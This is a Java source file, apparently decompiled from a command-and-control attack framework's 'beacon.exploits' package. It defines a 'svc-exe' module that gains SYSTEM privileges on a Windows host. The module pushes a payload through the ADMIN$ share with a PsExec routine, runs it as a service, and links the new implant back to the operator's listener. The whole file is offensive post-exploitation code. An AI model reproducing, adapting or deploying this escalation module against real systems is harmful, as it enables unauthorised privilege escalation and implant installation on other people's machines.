package beacon.exploits;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconExploits;
import beacon.TaskBeacon;
import common.ListenerUtils;
import common.ScListener;

public class ServiceEXE implements BeaconExploits.Exploit {
   protected AggressorClient client;

   public ServiceEXE(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconExploits(var1.getData()).register("svc-exe", "Get SYSTEM via an executable run as a service", this);
   }

   public void elevate(String var1, String var2) {
      ScListener var3 = ListenerUtils.getListener(this.client, var2);
      TaskBeacon var4 = new TaskBeacon(this.client, new String[]{var1});
      var4.PsExec(var1, ".", var4.arch(var1), var3, "ADMIN$");
      var4.linkToPayloadLocal(var3);
   }
}
